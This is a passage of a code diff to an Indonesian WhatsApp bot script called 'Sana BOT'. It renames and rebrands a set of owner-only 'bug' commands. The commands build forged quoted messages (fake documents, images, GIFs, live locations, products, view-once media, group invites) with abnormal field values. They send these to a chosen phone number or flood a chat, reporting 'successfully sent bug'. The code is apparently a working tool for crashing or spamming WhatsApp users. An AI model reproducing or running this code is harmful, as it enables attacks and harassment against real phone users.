+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    m.reply(`© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`)
                      }
                 break
-case 'kibug1':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '11':
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -5736,15 +5801,15 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 documentMessage: {
-title: `By: ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`, 
+title: `By: ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`, 
 jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
 } 
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fdoc})}
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fdoc})}
 break
 case 'kisendbug1':{
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let fdoc = {
 key : {
@@ -5752,17 +5817,17 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 documentMessage: {
-title: `By: ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`, 
+title: `By: ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`, 
 jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
 } 
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fdoc})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fdoc})
 await m.reply(`Berhasil Mengirim Bug1 Di Nomer ${text}`)
 }
 break
 case 'kigasbug1':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let fdoc1 = {
 key : {
@@ -5770,17 +5835,17 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 documentMessage: {
-title: `By: ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`, 
+title: `By: ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`, 
 jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
 } 
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fdoc1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fdoc1})
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fdoc1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fdoc1})
 await m.reply(`Berhasil Mengirim Bug1 Di Nomer ${text}`)
 break
-case 'kibug2':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '12':
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -5794,15 +5859,15 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`, 
+"caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`, 
 "jpegThumbnail": thumb
 } 
 } 
 }
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:foto})}
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:foto})}
 break
 case 'kisendbug2':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let foto = { 
 key: { 
@@ -5813,16 +5878,16 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`, 
+"caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`, 
 "jpegThumbnail": thumb
 } 
 } 
 }
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:foto})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:foto})
 await m.reply(`Berhasil Mengirim Bug2 Di Nomer ${text}`)
 break
 case 'kigasbug2':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let foto1 = { 
 key: { 
@@ -5833,17 +5898,17 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`, 
+"caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`, 
 "jpegThumbnail": thumb
 } 
 } 
 }
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:foto1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:foto1})
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:foto1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:foto1})
 await m.reply(`Berhasil Mengirim Bug2 Di Nomer ${text}`)
 break
-case 'kibug3':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '13':
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -5862,10 +5927,10 @@ message: {
 }
 } 
 }
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fvoc})}
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fvoc})}
 break
 case 'kisendbug3':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let fvoc = {
 key: { 
@@ -5881,11 +5946,11 @@ message: {
 }
 } 
 }
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fvoc})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fvoc})
 await m.reply(`Berhasil Mengirim Bug3 Di Nomer ${text}`)
 break
 case 'kigasbug3':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let fvoc1 = {
 key: { 
@@ -5901,12 +5966,12 @@ message: {
 }
 } 
 }
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fvoc1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fvoc1})
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fvoc1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fvoc1})
 await m.reply(`Berhasil Mengirim Bug3 Di Nomer ${text}`)
 break
-case 'kibug4':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '14':
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -5920,15 +5985,15 @@ message: { "videoMessage": {
 "title":"hallo bang","h": 
 `Hmm`,'seconds': '359996400', 
 'gifPlayback': 'true', 
-'caption': `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+'caption': `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
 'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
 }
 }
 }
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fgif})}
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fgif})}
 break
 case 'kisendbug4':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let fgif = { 
 key: {
@@ -5939,16 +6004,16 @@ message: { "videoMessage": {
 "title":"hallo bang","h": 
 `Hmm`,'seconds': '359996400', 
 'gifPlayback': 'true', 
-'caption': `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+'caption': `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
 'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
 }
 }
 }
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fgif})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fgif})
 await m.reply(`Berhasil Mengirim Bug4 Di Nomer ${text}`)
 break
 case 'kigasbug4':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let fgif1 = { 
 key: {
@@ -5959,17 +6024,17 @@ message: { "videoMessage": {
 "title":"hallo bang","h": 
 `Hmm`,'seconds': '359996400', 
 'gifPlayback': 'true', 
-'caption': `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+'caption': `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
 'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
 }
 }
 }
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fgif1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fgif1})
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fgif1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fgif1})
 await m.reply(`Berhasil Mengirim Bug4 Di Nomer ${text}`)
 break
-case 'kibug5':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '15':
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -5980,15 +6045,15 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 liveLocationMessage: {
-caption: `By: ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+caption: `By: ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
 jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
 }
 }
 }
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:floc})}
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:floc})}
 break 
 case 'kisendbug5':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let floc = {
 key : {
@@ -5996,16 +6061,16 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 liveLocationMessage: {
-caption: `By: ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+caption: `By: ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
 jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
 }
 }
 }
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:floc})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:floc})
 await m.reply(`Berhasil Mengirim Bug5 Di Nomer ${text}`)
 break 
 case 'kigasbug5':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let floc1 = {
 key : {
@@ -6013,17 +6078,17 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 liveLocationMessage: {
-caption: `By: ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+caption: `By: ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
 jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
 }
 }
 }
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:floc1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:floc1})
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:floc1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:floc1})
 await m.reply(`Berhasil Mengirim Bug5 Di Nomer ${text}`)
 break 
-case 'kibug6':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '16':
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -6039,17 +6104,17 @@ message: {
 "productImage":{ 
 "mimetype": "image/jpeg", 
 "jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
-"title": "❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵", 
-"description": "❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵", 
+"title": "❴ ㅊ ❈ Sana BOTㅊ ❈ ❵", 
+"description": "❴ ㅊ ❈ Sana BOTㅊ ❈ ❵", 
 "currencyCode": "USD", 
 "priceAmount1000": "5000000000", 
-"retailerId": "❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵", 
+"retailerId": "❴ ㅊ ❈ Sana BOTㅊ ❈ ❵", 
 "productImageCount": 1}, 
 "businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:ftoko})}
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:ftoko})}
 break
 case 'kisendbug6':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let ftoko = { 
 key: { 
@@ -6062,18 +6127,18 @@ message: {
 "productImage":{ 
 "mimetype": "image/jpeg", 
 "jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
-"title": "❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵", 
-"description": "❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵", 
+"title": "❴ ㅊ ❈ Sana BOTㅊ ❈ ❵", 
+"description": "❴ ㅊ ❈ Sana BOTㅊ ❈ ❵", 
 "currencyCode": "USD", 
 "priceAmount1000": "5000000000", 
-"retailerId": "❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵", 
+"retailerId": "❴ ㅊ ❈ Sana BOTㅊ ❈ ❵", 
 "productImageCount": 1}, 
 "businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:ftoko})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:ftoko})
 await m.reply(`Berhasil Mengirim Bug6 Di Nomer ${text}`)
 break
 case 'kigasbug6':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let ftoko1 = { 
 key: { 
@@ -6086,19 +6151,19 @@ message: {
 "productImage":{ 
 "mimetype": "image/jpeg", 
 "jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
-"title": "❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵", 
-"description": "❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵", 
+"title": "❴ ㅊ ❈ Sana BOTㅊ ❈ ❵", 
+"description": "❴ ㅊ ❈ Sana BOTㅊ ❈ ❵", 
 "currencyCode": "USD", 
 "priceAmount1000": "5000000000", 
-"retailerId": "❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵", 
+"retailerId": "❴ ㅊ ❈ Sana BOTㅊ ❈ ❵", 
 "productImageCount": 1}, 
 "businessOwnerJid": `6285737134572@s.whatsapp.net`}}}
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:ftoko1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:ftoko1})
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:ftoko1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:ftoko1})
 await m.reply(`Berhasil Mengirim Bug6 Di Nomer ${text}`)
 break
-case 'kibug7':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '17':
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -6115,10 +6180,10 @@ viewOnce: true
 },
 },
 };
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:foncevid})}
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:foncevid})}
 break
 case 'kisendbug7':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let foncevid = { 
 key: {
@@ -6132,11 +6197,11 @@ viewOnce: true
 },
 },
 };
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:foncevid})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:foncevid})
 await m.reply(`Berhasil Mengirim Bug7 Di Nomer ${text}`)
 break
 case 'kigasbug7':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let foncevid1 = { 
 key: {
@@ -6150,12 +6215,12 @@ viewOnce: true
 },
 },
 };
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:foncevid1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:foncevid1})
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:foncevid1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:foncevid1})
 await m.reply(`Berhasil Mengirim Bug7 Di Nomer ${text}`)
 break
-case 'kibug8':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '18':
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -6171,10 +6236,10 @@ viewOnce: true
 },
 },
 };
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fonceimg})}
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fonceimg})}
 break
 case 'kisendbug8':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let fonceimg = {
 key: {
@@ -6187,11 +6252,11 @@ viewOnce: true
 },
 },
 };
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fonceimg})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fonceimg})
 await m.reply(`Berhasil Mengirim Bug8 Di Nomer ${text}`)
 break
 case 'kigasbug8':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let fonceimg1 = {
 key: {
@@ -6204,12 +6269,12 @@ viewOnce: true
 },
 },
 };
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fonceimg1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fonceimg1})
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fonceimg1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fonceimg1})
 await m.reply(`Berhasil Mengirim Bug8 Di Nomer ${text}`)
 break
-case 'kibug9':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '19':
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -6224,13 +6289,13 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 "groupJid": "62895619083555-1616169743@g.us",
 "inviteCode": "mememteeeekkeke",
 "groupName": "P",
-"caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+"caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
  'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fgc})
